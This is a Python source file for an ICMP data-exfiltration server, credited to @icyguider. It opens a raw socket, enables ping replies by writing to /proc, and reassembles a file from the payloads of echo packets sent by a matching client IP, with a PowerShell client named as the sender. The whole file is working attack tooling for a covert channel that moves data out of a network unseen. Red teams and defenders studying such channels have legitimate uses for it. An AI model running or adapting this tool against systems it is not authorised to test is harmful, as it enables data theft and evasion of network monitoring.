#!/usr/bin/python3
#
# ICMP Data Exfiltration Server
# Created by Matthew David (@icyguider)

import socket
import sys
import os
import argparse

def enablePingReply():
    try:
        f = open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w+")
        contents = f.read()
        if contents[0] != "0":
            os.system('echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        f.close()
    except:
        print("[!] You need to run this tool with administrator privileges.")
        sys.exit()

def main(filename, src):
    enablePingReply()
    if os.path.exists(filename):
        overwrite = input("The supplied file already exists. Would you like to overwrite it? (Y/n): ")
        if overwrite.lower() == "y":
            os.system("rm {}".format(filename))
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    print("Server ready and listening for requests")
    print("Use ICMP Exfil client: Invoke-IcmpUpload server file")
    last = b""
    first = True
    while True:
        data, addr = s.recvfrom(1508)
        if addr[0] == src:
            if first == True:
                print("Connection received from client, saving bytes to file...")
                first = False
            payload = data[28:]
            f = open(filename, 'a+b')
            contents = f.read()
            if b'icmp exfil has completed' == payload:
                print("File transfer completed!")
                sys.exit()
            if payload != last:
                f.write(payload)
            f.close()
            last = payload

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ICYGUIDER\'S ICMP FILE UPLOAD SERVER')
    parser.add_argument("src", help="Public IP Address of client", type=str)
    parser.add_argument("file", help="File to write data to", type=str)
    if len(sys.argv) < 3:
        parser.print_help()
        sys.exit()
    args = parser.parse_args()
    main(args.file, args.src)
